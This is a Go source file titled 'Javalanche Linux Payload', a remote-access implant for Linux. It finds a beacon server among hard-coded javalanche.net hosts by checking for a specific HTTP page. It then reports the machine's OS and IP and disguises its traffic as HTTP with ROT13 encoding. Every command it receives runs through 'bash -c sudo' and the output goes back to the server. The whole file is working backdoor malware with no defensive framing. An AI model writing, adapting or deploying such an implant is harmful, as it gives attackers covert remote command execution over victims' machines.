/*
Javalanche Linux Payload
Author: James Southcott
*/

package main

import (
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os/exec"
	"strings"
	"time"
)

func resolveBeaconIPAddr() string {
	beacons := []string{"beacon1.javalanche.net", "beacon2.javalanche.net"}

	// Resolve ip's of of the beacons
	for _, element := range beacons {
		ips, err := net.LookupIP(element)
		if err == nil {
			for _, ip := range ips {
				// Send http request to the resolved ip to make sure we can communicate over http
				conn, err := net.DialTimeout("tcp", (ip.String() + ":80"), 10*time.Second)
				if err == nil {
					defer conn.Close()
					fmt.Fprintf(conn, "GET / HTTP/1.1\n")
					reader := bufio.NewReader(conn)
					message1, err1 := reader.ReadString('\n')
					message2, err2 := reader.ReadString('\n')
					message3, err3 := reader.ReadString('\n')
					message4, err4 := reader.ReadString('\n')
					message5, err5 := reader.ReadString('\n')
					message6, err6 := reader.ReadString('\n')
					message7, err7 := reader.ReadString('\n')
					message8, err8 := reader.ReadString('\n')
					message9, err9 := reader.ReadString('\n')
					message10, err10 := reader.ReadString('\n')
					message11, err11 := reader.ReadString('\n')
					message12, err12 := reader.ReadString('\n')
					if err1 == nil && err2 == nil && err3 == nil && err4 == nil && err5 == nil && err6 == nil && err7 == nil && err8 == nil && err9 == nil && err10 == nil && err11 == nil && err12 == nil {
						if message1 == "HTTP/1.1 200 OK\r\n" && message2 == "Content-Type: text/html\r\n" && message3 == "\r\n" && message4 == "<!DOCTYPE html>\r\n" && message5 == "<html>\r\n" && message6 == "<head>\r\n" && message7 == "<title>Javalanche</title>\r\n" && message8 == "</head>\r\n" && message9 == "<body>\r\n" && message10 == "<h1>Welcome to Javalanche</h1>\r\n" && message11 == "</body>\r\n" && message12 == "</html>\r\n" {
							return ip.String()
						}
					} else {
						fmt.Print("Error getting response\n")
					}
				}
			}
		}
	}
	return "0"
}

func rot13Encrypt(input string) string {
	var result strings.Builder
	for _, char := range input {
		switch {
		case 'a' <= char && char <= 'z':
			result.WriteRune((char-'a'+13)%26 + 'a')
		case 'A' <= char && char <= 'Z':
			result.WriteRune((char-'A'+13)%26 + 'A')
		default:
			result.WriteRune(char)
		}
	}
	return result.String()
}

func sendKeepAlive(socket net.Conn) {
	packet := "HTTP/1.1 200 OK\r\nContent-Length: 11\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n" + rot13Encrypt("KEEP_ALIVE") + "\r\n"
	for {
		randomTime := rand.Intn(60) + 30
		time.Sleep(time.Duration(randomTime) * time.Second)
		fmt.Fprintf(socket, packet)
	}
}

func main() {
	// Resolve IP Address of a Beacon Server
	serverIPAddress := resolveBeaconIPAddr()
	if serverIPAddress != "0" {
		// Connect to Beacon Server
		serverConn, err := net.Dial("tcp", (serverIPAddress + ":80"))
		if err != nil {
			fmt.Print("Error connecting to server\n")
		} else {
			go sendKeepAlive(serverConn)
			defer serverConn.Close()
			// First message is the OS of this machine
			fmt.Fprintf(serverConn, "Linux\n")

			// Get IP Address of this host and send it as the second message
			hostIPAddr := strings.Split(serverConn.LocalAddr().String(), ":")[0] + "\n"
			fmt.Fprintf(serverConn, hostIPAddr)

			// Main while loop to listen and execute commands
			reader := bufio.NewReader(serverConn)
			for {
				message, err := reader.ReadString('\n')
				if err == nil {
					if message != "HTTP/1.1 200 OK\r\n" && !(strings.Contains(message, "Content-Length: ")) && message != "Content-Type: text/plain; charset=utf-8\r\n" && message != "\r\n" {
						serverMessage := rot13Encrypt(message)
						if serverMessage != "KEEP_ALIVE\n" {
							// As long as the message is not a KEEP_ALIVE message or apart of the
							// HTTP header, execute it as a command
							cmd := exec.Command("bash", "-c", "sudo "+serverMessage)
							output, err := cmd.Output()
							cmd.Stdout = io.Discard
							cmd.Stderr = io.Discard
							if err != nil {
								fmt.Println("Error Executing command: ", err)

								finalOutput := "END_OF_OUTPUT\r\n"
								fmt.Fprintf(serverConn, rot13Encrypt(finalOutput))
							} else {
								finalOutput := string(output) + "END_OF_OUTPUT\r\n"

								fmt.Fprintf(serverConn, rot13Encrypt(finalOutput))
							}
						}
					}
				}
			}
		}
	}
}
